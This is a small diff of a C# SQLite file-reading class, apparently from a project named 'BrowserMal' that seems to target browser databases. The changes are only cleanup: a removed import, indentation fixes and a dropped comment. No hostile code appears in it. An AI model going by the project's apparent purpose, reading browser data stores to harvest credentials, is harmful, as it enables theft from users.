@@ -1,5 +1,4 @@
-﻿using Microsoft.VisualBasic;
-using System;
+﻿using System;
 using System.IO;
 using System.Runtime.CompilerServices;
 using System.Text;
@@ -7,7 +6,7 @@ using Microsoft.VisualBasic.CompilerServices;
 
 namespace BrowserMal.SQLite
 {
-	public class SqliteHandler
+    public class SqliteHandler
 	{
 		private byte[] databaseBytes;
 
@@ -54,7 +53,7 @@ namespace BrowserMal.SQLite
 
 		private void ReadFile(string path)
         {
-			var buffer = new byte[10240]; //0x10000
+			var buffer = new byte[10240];
 			int bytes;
 
 			using (var inputFile = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
